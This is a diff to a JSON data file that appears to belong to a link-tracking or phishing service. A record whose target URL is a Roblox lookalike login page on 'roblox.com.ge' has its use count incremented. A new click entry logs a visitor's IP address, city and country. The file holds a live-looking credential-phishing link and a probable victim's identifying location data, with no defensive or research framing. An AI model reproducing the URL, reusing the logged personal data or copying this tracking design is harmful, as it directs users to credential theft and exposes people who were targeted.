@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1329,
+    "useCount": 1330,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10800,6 +10800,14 @@
         "city": "London",
         "flag": "🇬🇧",
         "countryCode": "GB"
+      },
+      {
+        "timestamp": 1777407940018,
+        "ip": "177.226.36.218",
+        "country": "Mexico",
+        "city": "Tala",
+        "flag": "🇲🇽",
+        "countryCode": "MX"
       }
     ]
   },
